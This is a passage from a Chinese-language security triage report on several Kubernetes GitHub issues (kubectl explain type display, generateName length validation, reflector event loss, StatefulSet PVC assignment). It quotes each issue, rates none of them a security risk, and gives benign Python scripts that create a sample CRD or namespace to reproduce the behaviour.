print("该 Issue 被判定为功能性问题，不涉及安全风险，无需生成 POC 脚本。")
```


**解释说明：**

该 Issue 描述了 `kubectl cp` 命令在特定版本（v1.32.x）和跨 EKS 集群环境下间歇性失败并超时的现象。分析认为这是一个功能性的 Bug 或网络/协议层面的兼容性问题，而非安全漏洞。具体原因可能与 v1.32 引入的 exec 协议变更、Websocket 的 keep-alive 机制（日志中出现的 Ping/Pong）或跨集群网络环境下的延迟/丢包有关。

由于该问题：
1.  不涉及未授权访问、数据泄露、权限提升或远程代码执行。
2.  虽然影响了 `kubectl cp` 的可用性，但这是一种功能中断，且需要用户本身具备执行该命令的权限。根据判定标准，这种需要权限才能触发且影响自身的 DoS 不被视为高风险安全问题。
3.  没有证据表明一个用户触发此问题会影响其他用户。
4.  Issue 内容和日志未暴露敏感信息。

因此，该 Issue 被评定为“不涉及”安全风险，无需提供用于复现安全漏洞的 POC 脚本。提供的 Python 代码片段仅用于说明无需生成 POC。

---


## Issue #130946 Int-or-String fields are presented as Object in kubectl explain

- Issue 链接：[#130946](https://github.com/kubernetes/kubernetes/issues/130946)

### Issue 内容

#### What happened?

I created a CRD that has a map of int-or-string fields. When I `kubectl explain` that field, its type is presented as `<map[string]Object>`.

#### What did you expect to happen?

I'm not certain what I expect it to present, but acceptable values are not shaped like JSON objects.

#### How can we reproduce it (as minimally and precisely as possible)?

This CRD has a single field in its spec. Create or Apply this CRD, then run `kubectl explain` on it.

```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: maps.example.com
spec:
  group: example.com
  names:
    kind: Map
    listKind: MapList
    plural: maps
    singular: map
  scope: Namespaced
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          apiVersion:
            type: string
          kind:
            type: string
          metadata:
            type: object
          spec:
            type: object
            properties:
              options:
                type: object
                x-kubernetes-map-type: atomic
                maxProperties: 20
                additionalProperties:
                  anyOf:
                  - type: integer
                  - type: string
                  x-kubernetes-int-or-string: true
```

```console
$ kubectl explain Maps.spec
GROUP:      example.com
KIND:       Map
VERSION:    v1

FIELD: spec <Object>


DESCRIPTION:
    <empty>
FIELDS:
  options	<map[string]Object> 👈
    <no description>
```

```console
$ kubectl explain Maps.spec.options
GROUP:      example.com
KIND:       Map
VERSION:    v1

FIELD: options <map[string]Object> 👈


DESCRIPTION:
    <empty>
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.0
Kustomize Version: v5.5.0
Server Version: v1.32.1+k3s1
```

</details>


#### Cloud provider

n/a

#### OS version

`kubectl` on macOS


#### Install tools

<details>
Rancher Desktop
</details>


#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了在使用 `kubectl explain` 命令查询一个包含 `int-or-string` 类型字段的 Custom Resource Definition (CRD) 时，该字段的类型被显示为 `<map[string]Object>` 或 `<Object>`，而不是用户期望的更精确的类型表示（例如，能明确反映其既可以是整数也可以是字符串）。

问题核心在于 `kubectl explain` 如何解释和呈现 Kubernetes API 扩展中定义的 `x-kubernetes-int-or-string: true` 结合 `anyOf`（包含 integer 和 string 类型）的 OpenAPI v3 schema。`kubectl explain` 在遇到这种结构时，似乎将其简化或回退到了更通用的 `Object` 类型进行显示。

这是一个关于 `kubectl` 工具输出信息准确性的问题，影响的是开发者或管理员使用 `kubectl explain` 理解 CRD 结构时的体验和清晰度。它并不影响 CRD 的实际功能、数据验证或 API 服务器的行为。API 服务器仍然会根据 CRD schema 中定义的 `anyOf` 和 `x-kubernetes-int-or-string` 规则正确地验证和处理整数或字符串类型的值。

该问题不涉及：
1.  数据泄露：`kubectl explain` 只显示 schema 信息，不显示实例数据。
2.  未授权访问或权限提升：该问题与认证授权无关。
3.  拒绝服务：`kubectl explain` 的显示错误不会导致服务不可用。
4.  命令执行或代码注入：这纯粹是一个类型信息展示问题。
5.  数据篡改：不影响资源的创建、更新、删除操作的正确性。

该问题本质上是 `kubectl` 工具在解释和呈现特定 OpenAPI schema 结构时的一个显示缺陷或待改进之处，属于可用性问题，而非安全漏洞。

**复现过程：**

```python
# 该 Issue 描述的是 kubectl explain 命令的输出显示问题，
# 并非一个可以通过代码利用的安全漏洞。
# kubectl explain 是一个客户端工具，用于展示 K8s 资源的 Schema 信息，
# 其输出内容的精确性问题不构成安全风险。
# API Server 侧对 int-or-string 类型的实际处理不受此显示问题影响。
# 因此，无需提供复现安全风险的 POC 脚本。

# 下面的代码演示了如何使用 Python Kubernetes 客户端库创建 CRD，
# 但这仅用于设置环境，无法“复现”kubectl 的显示问题，因为该问题在于 kubectl 工具本身。

import kubernetes
import yaml
import time
import sys
from kubernetes import config, client, utils
from kubernetes.client import ApiClient, CustomObjectsApi, ApiextensionsV1Api
from kubernetes.client.rest import ApiException

CRD_YAML = """
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: maps.example.com
spec:
  group: example.com
  names:
    kind: Map
    listKind: MapList
    plural: maps
    singular: map
  scope: Namespaced
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          apiVersion:
            type: string
          kind:
            type: string
          metadata:
            type: object
          spec:
            type: object
            properties:
              options:
                type: object
                x-kubernetes-map-type: atomic
                maxProperties: 20
                additionalProperties:
                  anyOf:
                  - type: integer
                  - type: string
                  x-kubernetes-int-or-string: true
"""

def main():
    try:
        # 尝试从默认位置加载 kubeconfig
        print("加载 Kubernetes 配置...")
        config.load_kube_config()
        print("配置加载成功。")

        # 创建 API 客户端
        api_client = ApiClient()
        apiextensions_v1_api = ApiextensionsV1Api(api_client)

        crd_name = "maps.example.com"

        # 尝试删除已存在的 CRD (忽略错误)
        try:
            print(f"尝试删除可能已存在的 CRD: {crd_name}...")
            apiextensions_v1_api.delete_custom_resource_definition(crd_name)
            # 等待 CRD 完全删除
            print("等待 CRD 删除...")
            time.sleep(5)
        except ApiException as e:
            if e.status == 404:
                print(f"CRD {crd_name} 不存在，无需删除。")
            else:
                print(f"删除 CRD 时发生错误 (忽略): {e}")
        except Exception as e:
             print(f"删除 CRD 时发生未知错误 (忽略): {e}")


        # 创建 CRD
        print(f"创建 CRD: {crd_name}...")
        crd_body = yaml.safe_load(CRD_YAML)
        try:
            apiextensions_v1_api.create_custom_resource_definition(body=crd_body)
            print(f"CRD {crd_name} 创建成功。")
            # 等待 CRD 建立
            print("等待 CRD 建立...")
            time.sleep(5)
        except ApiException as e:
            print(f"创建 CRD 时发生错误: {e}")
            sys.exit(1)
        except Exception as e:
            print(f"创建 CRD 时发生未知错误: {e}")
            sys.exit(1)

        print("\nCRD 环境设置完成。")
        print("请手动运行以下命令查看 kubectl explain 的输出:")
        print(f"$ kubectl explain Maps.spec")
        print(f"$ kubectl explain Maps.spec.options")
        print("\n预期会看到 'options' 字段类型显示为 <map[string]Object> 或类似形式，")
        print("这正是 Issue 中描述的问题，但这并非安全风险。")

        # 清理 CRD (可选)
        # try:
        #     print(f"\n清理: 删除 CRD {crd_name}...")
        #     apiextensions_v1_api.delete_custom_resource_definition(crd_name)
        #     print(f"CRD {crd_name} 已删除。")
        # except ApiException as e:
        #     print(f"删除 CRD 时发生错误: {e}")
        # except Exception as e:
        #     print(f"删除 CRD 时发生未知错误: {e}")

    except config.ConfigException as e:
        print(f"无法加载 Kubernetes 配置: {e}")
        print("请确保 KUBECONFIG 环境变量已设置或配置文件位于默认位置 (~/.kube/config)。")
        sys.exit(1)
    except Exception as e:
        print(f"执行过程中发生错误: {e}")
        sys.exit(1)

# 直接执行 main 函数
main()
```


**解释说明：**

该 Issue 指出的问题是 `kubectl explain` 命令在展示包含 `int-or-string` 类型的 CRD 字段时，输出的类型信息不够精确（显示为 Object），这可能对用户理解字段预期类型造成困扰。然而，这仅仅是客户端工具 `kubectl` 的显示问题，并不影响 Kubernetes API Server 对该 CRD 实例的实际验证逻辑（它仍然会正确接受整数或字符串）。该问题不涉及任何安全机制的绕过、数据泄露、权限提升或服务中断等风险，因此不构成安全漏洞。

由于风险评级为“不涉及”，按照要求不需要提供用于复现安全风险的 POC 脚本。上面提供的 Python 脚本仅用于演示如何通过 Kubernetes Python 客户端库创建 Issue 中描述的 CRD。脚本执行后，用户需要手动运行 `kubectl explain Maps.spec` 和 `kubectl explain Maps.spec.options` 命令来观察 Issue 中描述的 `kubectl` 输出行为。这个脚本本身并不能“复现”`kubectl` 的显示问题，因为它关注的是 CRD 的创建而非 `kubectl` 的内部逻辑。脚本加载本地 kubeconfig 配置，连接到 Kubernetes 集群，创建 CRD，并提示用户后续使用 `kubectl` 进行观察。脚本中包含了基本的错误处理和资源清理（注释掉）的逻辑。

---


## Issue #130903 Namespace with metadata.generateName value longer than 63 characters fails to create

- Issue 链接：[#130903](https://github.com/kubernetes/kubernetes/issues/130903)

### Issue 内容

#### What happened?

Kubernetes fails to create a namespace object if the namespace's `metadata.generateName` field has a value that is > 63 characters. Even though `GenerateName` logic in Kubernetes truncates the provided value to create a unique name.






#### What did you expect to happen?

The namespace object to be created truncated to a valid length with randomized suffix.

#### How can we reproduce it (as minimally and precisely as possible)?

Reproduction with Kubernetes (both EKS and via minikube) Using Kubernetes 1.29 and 1.31.

namespace defined in yaml file.
```yaml
apiVersion: v1
kind: Namespace
metadata:
  generateName: a-long-name-012345678901234567890123456789012345678901234567890123456789-
```

> kubectl create -f namespace-too-log-test.yaml

Result:
> The Namespace "a-long-name-0123456789012345678901234567890123456789012345s7vj4" is invalid: metadata.generateName: Invalid value: "a-long-name-012345678901234567890123456789012345678901234567890123456789-": must be no more than 63 characters

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.29.12
WARNING: version difference between client (1.32) and server (1.29) exceeds the supported minor version skew of +/-1

```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.0 v0.8 (Cubic 2024-09-27 16:57)"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"

$ uname -a
Linux jasdel-5480-ubuntu 6.8.0-52-generic #53~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Jan 15 19:18:46 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **问题描述**: Issue 指出，当使用 `metadata.generateName` 字段创建 Kubernetes Namespace 时，如果该字段的值超过 63 个字符，即使 Kubernetes 的 `GenerateName` 逻辑本应截断该值并附加随机后缀以生成有效名称，创建操作也会失败。API Server 返回错误，明确指出 `metadata.generateName` 字段本身的值不能超过 63 个字符。
2.  **复现步骤**: 提供了包含超长 `generateName` 的 Namespace YAML 定义，并通过 `kubectl create` 命令复现了错误。错误信息 `Invalid value: "...": must be no more than 63 characters` 确认了 API Server 在处理请求时对 `generateName` 字段进行了长度校验。
3.  **预期行为**: 用户期望即使 `generateName` 前缀过长，Kubernetes 也能自动截断它，并成功创建具有有效长度名称的 Namespace。
4.  **安全风险分析**:
    *   该问题是 Kubernetes API Server 对输入字段 `metadata.generateName` 的验证逻辑与用户（或某些场景下的预期）不符。API Server 拒绝了它认为是无效的输入（字段值本身超长）。
    *   这并未引入代码执行、权限提升、信息泄露或容器逃逸等高风险漏洞。
    *   是否构成拒绝服务（DoS）？攻击者如果拥有创建 Namespace 的权限，可以通过发送大量此类无效请求来轻微增加 API Server 的负载（处理和拒绝请求）。然而：
        *   攻击者需要具备 `create namespace` 权限，这通常是较高权限（满足规则 5 的降级条件）。
        *   影响非常有限，仅阻止了特定（无效）资源的创建，不会导致 API Server 崩溃或影响其他合法操作的处理。这种影响程度不足以构成典型的 DoS 攻击。
        *   系统行为是明确拒绝无效输入，这是一种健壮性表现，而非漏洞。
    *   该问题不涉及敏感信息泄露（规则 4、6）。
    *   不会导致命令执行、提权等（规则 7）。
    *   不涉及低权限用户影响其他用户（规则 8）。
    *   问题描述清晰，信息充分（规则 9）。

5.  **结论**: 该 Issue 描述的是一个功能性问题或 API 行为与预期不符的问题，即 API Server 对 `generateName` 字段本身执行了长度校验，而不是仅校验最终生成的名称。这不构成安全漏洞。

**复现过程：**

```python
import sys
import time
from kubernetes import client, config
from kubernetes.client.exceptions import ApiException

def main():
    """
    尝试使用超长的 generateName 创建 Namespace，预期会失败。
    """
    # 假设 kubeconfig 文件位于默认位置 (~/.kube/config)
    try:
        config.load_kube_config()
        print("使用默认 kubeconfig 进行认证。")
    except Exception as e:
        print(f"无法加载 kubeconfig: {e}", file=sys.stderr)
        print("请确保 kubeconfig 文件存在且配置正确。", file=sys.stderr)
        sys.exit(1)

    # 创建 CoreV1Api 客户端
    api_instance = client.CoreV1Api()

    # 定义一个超长的 generateName
    # 长度大于 63 个字符
    long_generate_name = "a-very-long-namespace-name-that-is-designed-to-exceed-the-sixty-three-character-limit-"

    if len(long_generate_name) <= 63:
        print(f"错误：提供的 generateName '{long_generate_name}' 长度未超过63字符，请修改脚本。", file=sys.stderr)
        sys.exit(1)

    print(f"尝试使用 generateName (长度 {len(long_generate_name)}) 创建 Namespace: '{long_generate_name}'")

    # 定义 Namespace 对象
    namespace_body = client.V1Namespace(
        metadata=client.V1ObjectMeta(generate_name=long_generate_name)
    )

    start_time = time.time()
    request_timeout_seconds = 120 # 设置请求超时时间为 2 分钟

    try:
        # 尝试创建 Namespace
        # 设置请求超时
        api_response = api_instance.create_namespace(
            body=namespace_body,
            _request_timeout=request_timeout_seconds
        )
        # 如果成功了（不符合预期）
        print("意外：Namespace 创建成功！")
        print(f"生成的 Namespace 名称: {api_response.metadata.name}")
        # 如果意外成功，尝试删除它
        try:
            print(f"尝试删除意外创建的 Namespace: {api_response.metadata.name}")
            api_instance.delete_namespace(name=api_response.metadata.name)
            print("Namespace 已删除。")
        except ApiException as delete_e:
            print(f"删除 Namespace 时出错: {delete_e}", file=sys.stderr)
        except Exception as generic_delete_e:
             print(f"删除 Namespace 时发生未知错误: {generic_delete_e}", file=sys.stderr)

    except ApiException as e:
        # 预期会进入这里，捕获 API 异常
        elapsed_time = time.time() - start_time
        print(f"\n预期内的失败：Namespace 创建失败 (耗时 {elapsed_time:.2f} 秒)。")
        print(f"API 返回状态码: {e.status}")
        print(f"原因: {e.reason}")
        # 打印部分响应体以确认错误信息
        if e.body:
             # 尝试解码 body (通常是 JSON 字符串)
            try:
                import json
                error_details = json.loads(e.body)
                print(f"错误详情 (来自 API Server): {json.dumps(error_details, indent=2, ensure_ascii=False)}")
                # 检查错误信息是否与 Issue 中描述的一致
                if "metadata.generateName" in e.body and "must be no more than 63 characters" in e.body:
                    print("\n验证成功：错误信息与 Issue 中描述的验证失败一致。")
                else:
                    print("\n警告：错误信息与预期不完全一致，请检查详情。")
            except json.JSONDecodeError:
                print(f"错误详情 (原始文本): {e.body}")
            except Exception as parse_e:
                print(f"解析错误详情时出错: {parse_e}", file=sys.stderr)
                print(f"错误详情 (原始文本): {e.body}")
        else:
            print("API 未返回错误详情体。")

    except Exception as e:
        elapsed_time = time.time() - start_time
        print(f"\n发生非 API 异常错误 (耗时 {elapsed_time:.2f} 秒): {e}", file=sys.stderr)
        sys.exit(1)

# 直接执行 main 函数
main()
```


**解释说明：**

1.  **目的**: 该 Python 脚本旨在使用 Kubernetes Python 客户端库复现 Issue 中描述的问题，即尝试创建一个 `metadata.generateName` 字段值超过 63 个字符的 Namespace，并验证该操作是否会如预期般失败。
2.  **库**: 脚本使用了 `kubernetes` Python 库与 Kubernetes 集群进行交互。
3.  **认证**: 脚本通过 `kubernetes.config.load_kube_config()` 从默认位置（通常是 `~/.kube/config`）加载 Kubernetes 配置，以获取与集群通信所需的认证信息。
4.  **操作**:
    *   定义了一个长度超过 63 个字符的字符串 `long_generate_name`。
    *   创建了一个 `kubernetes.client.V1Namespace` 对象，其 `metadata.generate_name` 设置为这个长字符串。
    *   调用 `CoreV1Api` 的 `create_namespace` 方法尝试在集群中创建这个 Namespace。
    *   设置了 `_request_timeout` 参数以确保脚本不会无限期等待，符合超时要求。
5.  **预期结果与验证**:
    *   脚本预期 `create_namespace` 调用会失败，并抛出 `kubernetes.client.exceptions.ApiException`。
    *   在 `except ApiException` 块中，脚本会打印出失败信息，包括 HTTP 状态码、原因和 API Server 返回的错误详情（body）。
    *   脚本会特别检查返回的错误详情中是否包含类似 "metadata.generateName ... must be no more than 63 characters" 的关键信息，以确认失败原因与 Issue 中描述的一致。
    *   如果 Namespace 意外创建成功（这不符合 Issue 描述和预期），脚本会打印成功信息并尝试删除该 Namespace。
6.  **执行**: 脚本可以直接通过 Python 解释器执行。它没有定义 `if __name__ == "__main__":` 块，而是直接调用 `main()` 函数。

该脚本模拟了用户尝试进行无效操作的场景，并验证了 Kubernetes API Server 的行为（拒绝无效输入），从而复现了 Issue 中报告的现象，但这并不代表存在安全风险。

---


## Issue #130898 API server reflector may lose events if TransformFromStorage fails

- Issue 链接：[#130898](https://github.com/kubernetes/kubernetes/issues/130898)

### Issue 内容

#### What happened?

Hi 👋 ,

I'm investigating an issue where create or update operations on `Secrets` are _randomly_ not reflected in the controller runtime client cache. We have observed this behaviour multiple times, in at least 3 different operators, all relying on the controller-runtime client, and one of them being the External Secrets Operator. As a result the controllers indefinitely attempt to reconcile the missed `Secrets` from their stale cache, perpetually getting `409` errors until they are manually restarted. These Secrets seem to be lost by the `Watch` mechanism, while they are successfully created (as confirmed by audit logs), and eventually available in a `List` result.

After some investigations I realized that when this problem occur we also have transient errors related to Secret decryption, for example:

```
watcher.go:471] failed to prepare current and previous objects: failed to decrypt DEK, error: rpc error: code = Canceled desc = grpc: the client connection is closing
reflector.go:467] storage/cacher.go:/secrets: retrying watch of *core.Secret internal error: Internal error occurred: failed to decrypt DEK, error: rpc error: code = Canceled desc = grpc: the client connection is closing
```

I have tried to understand how events are processed in `storage/etcd3/watcher.go`, more specifically here:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/apiserver/pkg/storage/etcd3/watcher.go#L427-L437

IIUC when an error occurs, an "error event" is sent back to the reflector through a channel:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/apiserver/pkg/storage/etcd3/watcher.go#L469-L474


But IIUC we keep processing other incoming events? This leads me to wonder if there is not a situation where:

1. etcd watcher temporary fails to decrypt a Secret with `resourceVersion=V`, the error is sent to the reflector:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/client-go/tools/cache/reflector.go#L737-L743

2. Assuming that `case apierrors.IsInternalError(err) && retry.ShouldRetry()` is true the reflector is going to run the `watchHandler` again:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/client-go/tools/cache/reflector.go#L466-L468

3. Meanwhile, let's suppose that the etcd watcher managed to decrypt another `Secret`, with a different name and with `resourceVersion=V+1`, the result is sent to the watcher which calls `setLastSyncResourceVersion` with `V+1` as a value here:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/client-go/tools/cache/reflector.go#L791

Which feels wrong since `Secret` with `resourceVersion` `V` has not been observed yet?

I would like to know if this sounds like a possible scenario that may explain what we are observing. If not please let me know if you have any ideas that might explain it. Thanks!

We have observed this issue on K8s 1.30 (v1.30.10-eks-bc803b4) with the following libraries:
* k8s.io/api v0.32.2
* k8s.io/apimachinery v0.32.2
* k8s.io/client-go v0.32.2
* sigs.k8s.io/controller-runtime v0.20.2

#### What did you expect to happen?

I think I would expect the Secrets which suffered what could be a temporary decryption failure to be eventually reflected in the cache.

#### How can we reproduce it (as minimally and precisely as possible)?

Unfortunately, this happens randomly in our case 😕 That being said if I run the API Server in a dev environment and _temporarily_ return an error in the `TransformFromStorage` function for a specific `Secret`, I can observe that this `Secret` is never going to be sent to a client while other `Secrets` created at the same time are correctly reflected in the controller-runtime client.

#### Anything else we need to know?

This part of the code is (really) new to me but I'm happy to help, so please let me know if there is anything else I should investigate!

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: v1.30.10-eks-bc803b4
```

</details>


#### Cloud provider

<details>
* EKS (eks.23 / K8s 1.30) 
</details>


#### OS version

_No response_

#### Install tools




#### Container runtime (CRI) and version (if applicable)




#### Related plugins (CNI, CSI, ...) and versions (if applicable)




### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了一个 Kubernetes API Server 中 Reflector 组件在处理 Watch 事件时可能存在的问题。具体来说，当 `TransformFromStorage` 函数（例如，在解密 Secret 时）失败时，Reflector 可能会丢失该事件。

问题流程分析：
1.  Etcd Watcher 监听到一个资源（如 Secret A，版本 V）的变更。
2.  API Server 尝试通过 `TransformFromStorage` 处理该资源，但在这一步失败（例如，由于临时的 KMS 或网络问题导致解密 DEK 失败）。
3.  Watcher 将一个错误事件发送给 Reflector。
4.  Reflector 收到错误事件。根据代码逻辑 (`apierrors.IsInternalError(err) && retry.ShouldRetry()`)，Reflector 准备重试 Watch 操作。
5.  在 Reflector 成功重试并处理 Secret A (版本 V) *之前*，Etcd Watcher 可能成功处理了 *另一个* 资源（如 Secret B，版本 V+1）的事件。
6.  Watcher 将 Secret B (版本 V+1) 的事件发送给 Reflector。
7.  Reflector 成功处理了 Secret B (版本 V+1) 的事件，并调用 `setLastSyncResourceVersion` 将其内部记录的最新同步资源版本更新为 V+1。
8.  当 Reflector 稍后重试 Watch 操作时（可能因为之前的错误），它可能会从 V+1 版本开始 Watch，从而永久性地错过了版本 V 的 Secret A 事件。

后果：
依赖于 Watch 机制的 Controller (如 `controller-runtime` 的 client cache) 将无法接收到 Secret A 的更新或创建事件，导致其缓存状态与实际集群状态不一致。这会引发 Controller 的错误行为，例如不断尝试基于过时信息进行协调，并可能收到 `409 Conflict` 错误，直到 Controller 重启以强制进行 List 操作同步完整状态。

安全风险评估：
*   **问题性质：** 这是一个数据一致性和可靠性问题。控制器的缓存可能与实际状态不符。
*   **触发条件：** 该问题由内部错误（如 Secret 解密失败）触发，而不是由外部攻击者直接控制。解密失败通常与 KMS 服务可用性、网络分区或 API Server 与 KMS 之间的连接问题有关。
*   **影响范围：** 主要影响依赖 Watch 机制获取最新资源状态的 Controller 的正确性。如果 Controller 负责管理敏感配置或凭据（存储在 Secret 中），那么未能及时获取更新可能间接导致安全问题（例如，旧凭据未按预期轮换）。
*   **可利用性：** 攻击者无法直接利用此问题来执行恶意操作，如提权、命令执行或信息泄露（除了控制器本应看到的信息之外）。攻击者需要先引起 `TransformFromStorage` 失败，这通常需要对底层基础设施（如 KMS）有一定程度的控制或遇到特定的系统故障。
*   **拒绝服务 (DoS)：** 这可能导致依赖受影响 Controller 的服务功能部分或完全不可用，但这不是典型的由攻击者发起的 DoS 攻击。根据标准 5，即使可以看作某种形式的 DoS（功能失效），其触发并非由低权限用户发起，而是系统内部错误。
*   **敏感信息暴露 (Criterion 4)：** Issue 提交者未暴露敏感信息。
*   **高风险场景 (Criterion 7, 8)：** 不涉及命令执行、容器逃逸、提权或跨租户影响。

结论：该问题本质上是一个由内部错误触发的系统可靠性缺陷，导致数据不一致。虽然其后果可能影响依赖这些数据的系统的安全性（例如，延迟了凭证轮换），但它本身不是一个可被攻击者直接利用来破坏系统安全边界（如提权、获取未授权数据）的漏洞。根据提供的风险判断标准，特别是第 2、3、5 条，该问题不构成一个安全漏洞。

**复现过程：**

```python
# N/A
# 该 Issue 被评估为 "不涉及" 安全风险，主要是一个可靠性/数据一致性问题。
# 根据要求，仅对高风险问题提供 POC。
# 此问题难以通过简单的外部脚本稳定复现，因为它依赖于模拟 API Server 内部处理 Watch 事件时发生的特定错误（如 TransformFromStorage 失败）以及精确的时序。
# 用户在 Issue 中描述了通过修改 API Server 内部代码来模拟此场景的方法，这不适合作为外部 POC。
```


**解释说明：**

该 Issue 描述的是 Kubernetes API Server 在处理 Watch 事件时，由于内部错误（如 Secret 解密失败）和特定的事件处理顺序，可能导致 Reflector 丢失事件，进而使得 Controller 的缓存与实际状态不一致。这是一个系统可靠性问题，而非安全漏洞。攻击者无法直接利用此机制进行提权、信息泄露或执行命令。由于该问题不满足高风险漏洞的定义（如命令执行、提权等），且触发条件为内部错误而非攻击者行为，因此风险评级为“不涉及”。根据要求，我们不为非高风险或不涉及安全风险的 Issue 提供复现 POC。

---


## Issue #130895 How to each pod in the StatefulSet should be manually assigned a specific PVC?

- Issue 链接：[#130895](https://github.com/kubernetes/kubernetes/issues/130895)

### Issue 内容

#### What happened?

So i try to set each pod in the StatefulSet should be manually assigned a specific PVC without use volumeClaimTemplates.

I use the petch for each pods and statefulset also but there are not working.

So this is my pvc.yaml file code :

`apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: busybox-pvc-0
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: busybox-pvc-1
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: busybox-pvc-2
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
`

and this is my statefullset.yaml code :

`apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: busybox
spec:
  serviceName: "busybox-service"
  replicas: 3
  selector:
    matchLabels:
      app: busybox
  template:
    metadata:
      labels:
        app: busybox
    spec:
      containers:
      - name: busybox
        image: busybox
        command: ["/bin/sh", "-c", "sleep 3600"]
        volumeMounts:
        - name: busybox-storage
          mountPath: /mnt/data
      volumes:
      - name: busybox-storage
        persistentVolumeClaim:
          claimName: busybox-pvc-0`

and i try to use "petch" like this but there are get error like this:

`dev_2@Tadhak-dev-02:~/Backup/Opensearch/Stateful_PVC$ minikube kubectl -- patch pod busybox-0 --type='json' -p '[{"op": "replace", "path": "/
spec/volumes/0/persistentVolumeClaim/claimName", "value": "busybox-pvc-0"}]'
The request is invalid: the server rejected our request due to an error in our request
dev_2@Tadhak-dev-02:~/Backup/Opensearch/Stateful_PVC$ minikube kubectl -- patch pod busybox-1 --type='json' -p '[{"op": "replace", "path": "/spec/volumes/0/persistentVolumeClaim/claimName", "value": "busybox-pvc-1"}]'
The Pod "busybox-1" is invalid: spec: Forbidden: pod updates may not change fields other than `spec.containers[*].image`,`spec.initContainers[*].image`,`spec.activeDeadlineSeconds`,`spec.tolerations` (only additions to existing tolerations),`spec.terminationGracePeriodSeconds` (allow it to be set to 1 if it was previously negative)
  core.PodSpec{
  	Volumes: []core.Volume{
  		{
  			Name: "busybox-storage",
  			VolumeSource: core.VolumeSource{
  				... // 7 identical fields
  				ISCSI:     nil,
  				Glusterfs: nil,
  				PersistentVolumeClaim: &core.PersistentVolumeClaimVolumeSource{
- 					ClaimName: "busybox-pvc-0",
+ 					ClaimName: "busybox-pvc-1",
  					ReadOnly:  false,
  				},
  				RBD:     nil,
  				Quobyte: nil,
  				... // 18 identical fields
  			},
  		},
  		{Name: "kube-api-access-jzfbk", VolumeSource: {Projected: &{Sources: {{ServiceAccountToken: &{ExpirationSeconds: 3607, Path: "token"}}, {ConfigMap: &{LocalObjectReference: {Name: "kube-root-ca.crt"}, Items: {{Key: "ca.crt", Path: "ca.crt"}}}}, {DownwardAPI: &{Items: {{Path: "namespace", FieldRef: &{APIVersion: "v1", FieldPath: "metadata.namespace"}}}}}}, DefaultMode: &420}}},
  	},
  	InitContainers: nil,
  	Containers:     {{Name: "busybox", Image: "busybox", Command: {"/bin/sh", "-c", "sleep 3600"}, VolumeMounts: {{Name: "busybox-storage", MountPath: "/mnt/data"}, {Name: "kube-api-access-jzfbk", ReadOnly: true, MountPath: "/var/run/secrets/kubernetes.io/serviceaccount"}}, ...}},
  	... // 30 identical fields
  }
`



#### What did you expect to happen?

So how to do this working for set each pod in the StatefulSet should be manually assigned a specific PVC without use volumeClaimTemplates.

busybox-0 → busybox-pvc-0
busybox-1 → busybox-pvc-1
busybox-2 → busybox-pvc-2



```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0

```


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了一个用户在使用 Kubernetes StatefulSet 时遇到的配置问题。用户希望为 StatefulSet 中的每个 Pod 手动分配一个预先创建好的、特定的 PersistentVolumeClaim (PVC)，而不是使用 `volumeClaimTemplates` 自动创建。

用户的尝试方法是：
1.  创建了三个独立的 PVC (`busybox-pvc-0`, `busybox-pvc-1`, `busybox-pvc-2`)。
2.  创建了一个 StatefulSet，其 Pod 模板 (`spec.template.spec.volumes`) 中硬编码引用了第一个 PVC (`busybox-pvc-0`)。
3.  尝试在 Pod 启动后，使用 `kubectl patch` 命令修改各个 Pod (`busybox-0`, `busybox-1`, `busybox-2`) 的 `spec.volumes[0].persistentVolumeClaim.claimName` 字段，使其指向对应的 PVC。

